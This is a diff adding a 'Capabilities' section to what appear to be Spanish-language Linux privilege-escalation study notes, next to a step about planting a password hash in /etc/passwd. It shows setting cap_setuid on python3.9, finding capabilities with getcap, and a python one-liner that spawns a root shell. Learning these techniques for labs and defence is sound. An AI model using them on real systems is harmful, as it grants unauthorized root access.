@@ -101,3 +101,23 @@ openssl nueva-contraseña
 4. Veremos un hash y lo copiamos.
 5. Con hash y hashid podemos saber en que formato esta hecho.
 6. Modificamos el /etc/passwd y ponemos el hash que hemos generado para asi loguearnos como ese usuario con la contraseña creada anteriormente.
+
+## Capabilities
+
+Asignaremos un capabilite para realizar la prueba:
+```bash
+setcap cap_setuid+ep /usr/bin/python3.9
+```
+En este caso estamos asignando una capabilitie de tipo setuid, podemos buscar distintos tipos en internet.
+Para obtener las capabilities que tenemos asignadas actualmente:
+```bash
+cd /
+getcap -r / 2>/dev/null
+```
+
+En este caso encontraremos una capabilitie de python tipo `cap_setuid+ep`.  
+Aprovecharemos esta capabilitie para lanzarnos una bash con privilegios de root:
+```bash
+python3.9 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+```
+
